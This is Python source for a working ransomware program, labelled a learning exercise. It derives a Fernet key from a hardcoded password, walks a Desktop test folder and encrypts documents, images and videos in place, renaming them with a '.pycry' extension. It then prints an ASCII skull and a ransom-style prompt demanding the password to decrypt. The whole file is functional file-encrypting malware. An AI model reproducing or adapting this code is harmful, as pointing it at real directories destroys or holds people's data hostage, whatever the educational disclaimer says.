import os
import hashlib
import hextobase64
import rsa
from cryptography.fernet import Fernet

'''
This program is not inteded for malicious use.
It is for learning purposes only.
The aes password used to generate the key is hardcoded into this file.
'''

#generates an aes key to encrypt the data
key = 'spongebob'
key = Fernet(hextobase64.hex_to_base64(hashlib.sha256(key.encode('utf-8')).hexdigest()))



#sets starting directory
#the default is the desktop of the current user
stardir = "/Users/{}/Desktop/testfolder".format(os.getenv('username'))


#file extensions to encrypt
extensions = ['.txt','.jpeg','.png','.jpg', '.docx', '.mp4', '.mov']

#encrypts files using key
def encryptFile(filename, passw):
    with open(filename, "r+b") as file:
        filedata = file.read()
        encrypted_data = passw.encrypt(filedata)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

#decrypts files using user input key
def decryptFile(filename, passw):
    with open(filename, "r+b") as file:
        encrypted_data = file.read()
        decrypted_data = passw.decrypt(encrypted_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)


#look through files staring from chosen directory and encrypts them
def getFiles(passw):
    print('The following files have been encrypted:')
    for root, dirs, files in os.walk(stardir):
        for file in files:
            if os.path.splitext(file)[1].lower() in extensions:
                print(os.path.join(root, file))
                encryptFile(os.path.join(root, file), passw)
                os.rename(os.path.join(root, file), os.path.join(root, file) + '.pycry') 

#look through files staring from chosen directory and encrypts them
def ungetFiles(passw):
    print('The following files have been decrypted:')
    for root, dirs, files in os.walk(stardir):
        for file in files:
            if os.path.splitext(file)[1].lower() == '.pycry':
                print(os.path.join(root, file))
                decryptFile(os.path.join(root, file), passw)
                os.rename(os.path.join(root, file), os.path.join(root, file).replace('.pycry','')) 

#lets user decrypt files based on password
def userDecrypt():
    print('Oh no! Your files have been encrypted!\n')
    print('Any file with the following file extension has beem encrypted:\n')
    for ext in extensions:
        print(ext + '\n')
    print('To decrypt them, you need to enter the password!\n')
    print('Type the password in extactly or you may lose all of your files!\n')
    password = input('Password:')
    password = Fernet(hextobase64.hex_to_base64(hashlib.sha256(password.encode('utf-8')).hexdigest()))
    ungetFiles(password)
    input("Press enter to exit")




#encrypt the files
getFiles(key)

print('''                    .ed"""" """$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       ."""*$$$$$$$$bc
                    .-"    .$***$$$"""*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*""""    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*                           *  J$$$e*
            """""                              "$$$"    ''')

#ask the user for the public rsa key
userDecrypt()